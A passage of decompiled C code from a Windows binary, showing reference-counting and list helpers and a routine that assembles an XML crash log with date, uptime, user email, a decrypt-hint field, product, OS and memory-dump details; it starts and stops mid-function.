  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_10030dd0 */

void __thiscall FUN_10030dd0(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  
  puVar3 = (undefined4 *)FUN_100582fa(0x20);
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = (undefined4 *)0x0;
  }
  else {
    piVar1 = (int *)*param_2;
    *puVar3 = piVar1;
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    puVar3[1] = param_2[1];
    puVar3[2] = param_2[2];
    piVar1 = (int *)param_2[3];
    puVar3[3] = piVar1;
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    piVar1 = (int *)param_2[4];
    puVar3[4] = piVar1;
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    puVar3[5] = param_2[5];
    puVar3[6] = 0xffffffff;
    puVar3[7] = 0xffffffff;
  }
  iVar2 = ((undefined4 *)*param_1)[1];
  if (iVar2 != -1) {
    *(undefined4 **)(iVar2 + 0x1c) = puVar3;
    puVar3[6] = *(undefined4 *)(*param_1 + 4);
    *(undefined4 **)(*param_1 + 4) = puVar3;
    param_1[1] = param_1[1] + 1;
    return;
  }
  *(undefined4 *)*param_1 = puVar3;
  *(undefined4 **)(*param_1 + 4) = puVar3;
  param_1[1] = param_1[1] + 1;
  return;
}



/* Function: FUN_10030e80 */

undefined4 * __thiscall FUN_10030e80(undefined4 param_1,undefined4 *param_2)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100744d9;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_2 = 0;
  local_8 = 0;
  FUN_10026a20(param_1);
  ExceptionList = local_10;
  return param_2;
}



/* Function: FUN_10030ee0 */

void __fastcall FUN_10030ee0(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = *param_1;
  if (iVar1 == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = iVar1 + param_1[1] * 4;
  }
  FUN_10017250(iVar1,iVar2);
  if (*param_1 != 0) {
    FUN_100579ee(*param_1);
  }
  return;
}



/* Function: FUN_10030f10 */

void __fastcall FUN_10030f10(int *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  undefined4 *puVar4;
  
  puVar2 = *(undefined4 **)(*param_1 + 4);
  *(undefined4 *)(*param_1 + 4) = 0xffffffff;
  *(undefined4 *)*param_1 = 0xffffffff;
  while (puVar2 != (undefined4 *)0xffffffff) {
    piVar3 = (int *)puVar2[4];
    puVar4 = (undefined4 *)puVar2[6];
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    piVar3 = (int *)puVar2[3];
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    piVar3 = (int *)*puVar2;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar1 = *piVar3;
      *piVar3 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    thunk_FUN_100579ee(puVar2);
    puVar2 = puVar4;
  }
  param_1[1] = 0;
  return;
}



/* Function: FUN_10030fa0 */

void __fastcall FUN_10030fa0(int *param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  
  piVar2 = (int *)*param_1;
  piVar4 = (int *)*piVar2;
  *piVar2 = (int)piVar2;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar4 != (int *)*param_1) {
    do {
      piVar2 = (int *)*piVar4;
      FUN_10030f10();
      thunk_FUN_100579ee(piVar4[9]);
      piVar3 = (int *)piVar4[8];
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar3;
        *piVar3 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      piVar3 = (int *)piVar4[3];
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar3;
        *piVar3 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      thunk_FUN_100579ee(piVar4);
      piVar4 = piVar2;
    } while (piVar2 != (int *)*param_1);
  }
  return;
}



/* Function: FUN_10031020 */

int * __thiscall FUN_10031020(int *param_1,undefined4 param_2)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
LAB_1003109f:
    uVar4 = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_1004b420(param_2,0xffffffff);
      if (iVar1 == 0) {
        return param_1;
      }
      piVar2 = (int *)FUN_10010370(param_1[2] + iVar1,1);
      if (piVar2 == (int *)0x0) {
        return param_1;
      }
      goto LAB_10031064;
    }
    if (param_1 == (int *)0x0) goto LAB_1003109f;
    uVar4 = param_1[1] - param_1[2];
  }
  uVar3 = FUN_1004b420(param_2,0xffffffff);
  if (uVar3 < uVar4) {
    param_1[2] = param_1[2] + uVar3;
    return param_1;
  }
  if (param_1 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = param_1[2];
  }
  piVar2 = (int *)FUN_10010290(iVar1 + uVar3);
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      *(undefined2 *)((int)param_1 + param_1[2] * 2 + 0xc) = 0;
    }
    return param_1;
  }
LAB_10031064:
  iVar1 = FUN_1004b420(param_2,0xffffffff);
  piVar2[2] = piVar2[2] + iVar1;
  return piVar2;
}



/* Function: FUN_10031100 */

int * __thiscall FUN_10031100(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
LAB_10031191:
    uVar4 = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_1004bc90(param_2,param_3,param_4);
      if (iVar1 == 0) {
        return param_1;
      }
      piVar2 = (int *)FUN_10010370(param_1[2] + iVar1,1);
      if (piVar2 == (int *)0x0) {
        return param_1;
      }
      goto LAB_1003114f;
    }
    if (param_1 == (int *)0x0) goto LAB_10031191;
    uVar4 = param_1[1] - param_1[2];
  }
  uVar3 = FUN_1004bc90(param_2,param_3,param_4);
  if (uVar3 < uVar4) {
    param_1[2] = param_1[2] + uVar3;
    return param_1;
  }
  if (param_1 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = param_1[2];
  }
  piVar2 = (int *)FUN_10010290(iVar1 + uVar3);
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      *(undefined2 *)((int)param_1 + param_1[2] * 2 + 0xc) = 0;
    }
    return param_1;
  }
LAB_1003114f:
  iVar1 = FUN_1004bc90(param_2,param_3,param_4);
  piVar2[2] = piVar2[2] + iVar1;
  return piVar2;
}



/* Function: FUN_10031200 */

int FUN_10031200(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076621;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar1 = FUN_10031290(param_1,param_2);
  local_8 = 1;
  if (iVar1 != -8) {
    FUN_100312d0(param_3);
  }
  ExceptionList = local_10;
  return iVar1;
}



/* Function: Catch_All@10031271 */

void Catch_All_10031271(void)

{
  code *pcVar1;
  int unaff_EBP;
  
  thunk_FUN_100579ee(*(undefined4 *)(unaff_EBP + 0xc));
  FUN_1005de1b(0,0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_10031290 */

void FUN_10031290(int *param_1,int *param_2)

{
  code *pcVar1;
  int *piVar2;
  
  piVar2 = (int *)FUN_100582fa(0x30);
  if (piVar2 == (int *)0x0) {
    FUN_10056a39();
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (param_1 == (int *)0x0) {
    param_1 = piVar2;
    param_2 = piVar2;
  }
  *piVar2 = (int)param_1;
  if (piVar2 + 1 != (int *)0x0) {
    piVar2[1] = (int)param_2;
  }
  return;
}



/* Function: FUN_100312d0 */

undefined4 * __thiscall FUN_100312d0(undefined4 *param_1,undefined4 *param_2)

{
  int *piVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076656;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = *param_2;
  piVar1 = (int *)param_2[1];
  param_1[1] = piVar1;
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
  }
  param_1[2] = param_2[2];
  param_1[3] = param_2[3];
  param_1[4] = param_2[4];
  param_1[5] = param_2[5];
  piVar1 = (int *)param_2[6];
  param_1[6] = piVar1;
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
  }
  local_8 = 1;
  FUN_10031370(param_2 + 7);
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10031370 */

int * __thiscall FUN_10031370(int *param_1,int *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  puVar3 = (undefined4 *)FUN_100582fa(8);
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = (undefined4 *)0x0;
  }
  else {
    *puVar3 = 0xffffffff;
    puVar3[1] = 0xffffffff;
  }
  *param_1 = (int)puVar3;
  param_1[1] = 0;
  for (puVar3 = *(undefined4 **)(*param_2 + 4); puVar3 != (undefined4 *)0xffffffff;
      puVar3 = (undefined4 *)puVar3[6]) {
    puVar4 = (undefined4 *)FUN_100582fa(0x20);
    if (puVar4 == (undefined4 *)0x0) {
      puVar4 = (undefined4 *)0x0;
    }
    else {
      piVar1 = (int *)*puVar3;
      *puVar4 = piVar1;
      if (piVar1 != (int *)0x0) {
        LOCK();
        *piVar1 = *piVar1 + 1;
        UNLOCK();
      }
      puVar4[1] = puVar3[1];
      puVar4[2] = puVar3[2];
      piVar1 = (int *)puVar3[3];
      puVar4[3] = piVar1;
      if (piVar1 != (int *)0x0) {
        LOCK();
        *piVar1 = *piVar1 + 1;
        UNLOCK();
      }
      piVar1 = (int *)puVar3[4];
      puVar4[4] = piVar1;
      if (piVar1 != (int *)0x0) {
        LOCK();
        *piVar1 = *piVar1 + 1;
        UNLOCK();
      }
      puVar4[5] = puVar3[5];
      puVar4[6] = 0xffffffff;
      puVar4[7] = 0xffffffff;
    }
    iVar2 = *(int *)*param_1;
    if (iVar2 == -1) {
      *(int *)*param_1 = (int)puVar4;
      *(undefined4 **)(*param_1 + 4) = puVar4;
    }
    else {
      *(undefined4 **)(iVar2 + 0x18) = puVar4;
      puVar4[7] = *(undefined4 *)*param_1;
      *(undefined4 **)*param_1 = puVar4;
    }
    param_1[1] = param_1[1] + 1;
  }
  return param_1;
}



/* Function: FUN_10031450 */

undefined4 * __fastcall FUN_10031450(undefined4 *param_1)

{
  undefined4 uVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_1007672d;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  param_1[10] = 0;
  param_1[0xb] = 0;
  param_1[0xc] = 0;
  param_1[0xd] = 0;
  param_1[0xe] = 0;
  param_1[0xf] = 0;
  param_1[0x10] = 0;
  param_1[0x11] = 0;
  param_1[0x12] = 0;
  param_1[0x13] = 0;
  param_1[0x14] = 0;
  local_8 = 0xf;
  param_1[0x15] = 0;
  param_1[0x16] = 0;
  param_1[0x17] = 1;
  param_1[0x18] = 0;
  param_1[0x19] = 0;
  uVar1 = FUN_10031290(0,0);
  param_1[0x18] = uVar1;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10031550 */

void __fastcall FUN_10031550(undefined4 *param_1)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  uint uVar5;
  int *piVar6;
  undefined4 extraout_ECX;
  uint uVar7;
  undefined4 extraout_ECX_00;
  int *piVar8;
  undefined4 local_30;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076758;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  piVar6 = (int *)*param_1;
  if (piVar6 != (int *)0x0) {
    if (*piVar6 == 0) {
      piVar6[2] = 0;
      *(undefined2 *)(piVar6 + 3) = 0;
      goto LAB_100315ad;
    }
    LOCK();
    iVar2 = *piVar6;
    *piVar6 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar6,uVar3);
    }
  }
  piVar6 = (int *)0x0;
LAB_100315ad:
  *param_1 = piVar6;
  uVar4 = FUN_1000bfa0(L"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"<crashlog>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_10031020(&DAT_10087bd8,extraout_ECX);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L" <when>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L" <date>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_100155d0(*(undefined2 *)(param_1 + 1),10);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_10083be4,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_100155d0(*(undefined2 *)((int)param_1 + 6),10);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_10083be4,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_100155d0(*(undefined2 *)((int)param_1 + 10),10);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"</date>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L" <time>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_100155d0(*(undefined2 *)(param_1 + 3),10);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_10083824,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_100155d0(*(undefined2 *)((int)param_1 + 0xe),10);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_10083824,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_100155d0(*(undefined2 *)(param_1 + 4),10);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"</time>",0xffffffff);
  *param_1 = uVar4;
  uVar1 = param_1[5];
  uVar3 = (uVar1 / 1000) / 0x3c;
  uVar7 = uVar3 / 0x3c;
  uVar3 = uVar3 % 0x3c;
  uVar5 = uVar7 / 0x18;
  uVar7 = uVar7 % 0x18;
  uVar4 = FUN_1000bfa0(L" <uptime>",0xffffffff);
  *param_1 = uVar4;
  if (uVar5 != 0) {
    uVar4 = FUN_100155d0(uVar5,10);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_10087c5c,0xffffffff);
    *param_1 = uVar4;
  }
  if ((uVar7 != 0) || (uVar5 != 0)) {
    uVar4 = FUN_100155d0(uVar7,10);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_10087c58,0xffffffff);
    *param_1 = uVar4;
  }
  if (((uVar3 != 0) || (uVar7 != 0)) || (uVar5 != 0)) {
    uVar4 = FUN_100155d0(uVar3,10);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_10087c64,0xffffffff);
    *param_1 = uVar4;
  }
  uVar4 = FUN_100155d0((uVar1 / 1000) % 0x3c,10);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_10087c60,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"</uptime>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L" </when>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  if (((param_1[6] != 0) && (*(int *)(param_1[6] + 8) != 0)) ||
     ((param_1[7] != 0 && (*(int *)(param_1[7] + 8) != 0)))) {
    uVar4 = FUN_1000bfa0(L" <user>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
    *param_1 = uVar4;
    if ((param_1[6] != 0) && (*(int *)(param_1[6] + 8) != 0)) {
      uVar4 = FUN_1000bfa0(L"  <email>",0xffffffff);
      *param_1 = uVar4;
      iVar2 = param_1[6];
      if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
        uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
        *param_1 = uVar4;
      }
      uVar4 = FUN_1000bfa0(L"</email>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
    }
    if ((param_1[7] != 0) && (*(int *)(param_1[7] + 8) != 0)) {
      uVar4 = FUN_1000bfa0(L"  <decrypthint>",0xffffffff);
      *param_1 = uVar4;
      iVar2 = param_1[7];
      if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
        uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
        *param_1 = uVar4;
      }
      uVar4 = FUN_1000bfa0(L"</decrypthint>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
    }
    uVar4 = FUN_1000bfa0(L" </user>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L" <product>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <prodname>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[8];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</prodname>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <prodver>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[9];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</prodver>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <builddate>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[10];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</builddate>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <buildtime>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[0xb];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</buildtime>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <buildmode>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[0xc];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</buildmode>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  if ((param_1[0xd] != 0) && (*(int *)(param_1[0xd] + 8) != 0)) {
    uVar4 = FUN_1000bfa0(L"  <bldtrgplatform>",0xffffffff);
    *param_1 = uVar4;
    iVar2 = param_1[0xd];
    if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
      uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
      *param_1 = uVar4;
    }
    uVar4 = FUN_1000bfa0(L"</bldtrgplatform>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L" </product>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L" <os>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <osname>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[0xe];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</osname>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <osver>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[0xf];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</osver>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[0x10];
  if (((iVar2 == 0) || (*(int *)(iVar2 + 8) == 0)) || ((iVar2 != 0 && (iVar2 != -0xc)))) {
    uVar4 = FUN_1000bfa0(L"  <ossp>",0xffffffff);
    *param_1 = uVar4;
    iVar2 = param_1[0x10];
    if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
      uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
      *param_1 = uVar4;
    }
  }
  else {
    uVar4 = FUN_1000bfa0(L"  <ossp>",0xffffffff);
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</ossp>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[0x11];
  if (((iVar2 == 0) || (*(int *)(iVar2 + 8) == 0)) || ((iVar2 != 0 && (iVar2 != -0xc)))) {
    uVar4 = FUN_1000bfa0(L"  <osspver>",0xffffffff);
    *param_1 = uVar4;
    iVar2 = param_1[0x11];
    if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
      uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
      *param_1 = uVar4;
    }
  }
  else {
    uVar4 = FUN_1000bfa0(L"  <osspver>",0xffffffff);
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</osspver>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <osspec>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[0x12];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</osspec>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L"  <oslmi>",0xffffffff);
  *param_1 = uVar4;
  iVar2 = param_1[0x13];
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
    *param_1 = uVar4;
  }
  uVar4 = FUN_1000bfa0(L"</oslmi>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(L" </os>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  piVar6 = param_1 + 0x14;
  *param_1 = uVar4;
  if ((*piVar6 != 0) && (*piVar6 != -0xc)) {
    uVar4 = FUN_1000bfa0(L" <dump>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
    *param_1 = uVar4;
    piVar8 = (int *)*piVar6;
    if (piVar8 != (int *)0x0) {
      LOCK();
      *piVar8 = *piVar8 + 1;
      UNLOCK();
    }
    local_8 = 0;
    uVar4 = FUN_1000bfa0(L"  <dmpname>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_10027850();
    uVar4 = FUN_1000bfa0(uVar4,0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(L"</dmpname>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
    *param_1 = uVar4;
    if (param_1[0x15] == 0) {
      FUN_100213b0(piVar6);
      param_1[0x15] = local_30;
    }
    uVar4 = FUN_1000bfa0(L"  <dmpsize>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_100155d0(param_1[0x15],10);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(L"</dmpsize>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
    *param_1 = uVar4;
    if (param_1[0x16] != 0) {
      uVar4 = FUN_1000bfa0(L"  <dmpsize>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1001e900(param_1[0x16],extraout_ECX_00);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(L"</dmpsize>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
    }
    if (param_1[0x17] != 1) {
      uVar4 = FUN_1000bfa0(L"  <bangcode>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_10031100(param_1[0x17],0,0x10);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(L"</bangcode>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
    }
    uVar4 = FUN_1000bfa0(L" </dump>",0xffffffff);
    *param_1 = uVar4;
    uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
    *param_1 = uVar4;
    if (piVar8 != (int *)0x0) {
      LOCK();
      iVar2 = *piVar8;
      *piVar8 = *piVar8 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(piVar8);
      }
    }
  }
  piVar6 = *(int **)param_1[0x18];
  if (piVar6 != (int *)param_1[0x18]) {
    do {
      uVar4 = FUN_1000bfa0(L" <thread>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
      if (((piVar6[3] != 0) && (*(int *)(piVar6[3] + 8) != 0)) || (piVar6[4] != 0)) {
